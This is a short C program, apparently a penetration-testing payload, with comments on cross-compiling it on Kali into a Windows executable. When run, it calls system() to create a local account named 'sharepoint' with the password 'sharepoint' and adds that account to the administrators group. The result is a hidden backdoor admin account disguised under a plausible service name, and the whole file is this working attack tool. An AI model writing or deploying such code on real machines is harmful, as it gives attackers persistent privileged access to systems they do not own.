#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
/* Creates a user called sharepoint with password sharepoint. Add's user to local administrators group. */
/* To cross compile on kali - i686-w64-mingw32-gcc -o useradd.exe useradd.c */
int main () {
int i;
i=system ("net user sharepoint sharepoint /add & net localgroup administrators sharepoint /add"); return 0;
}
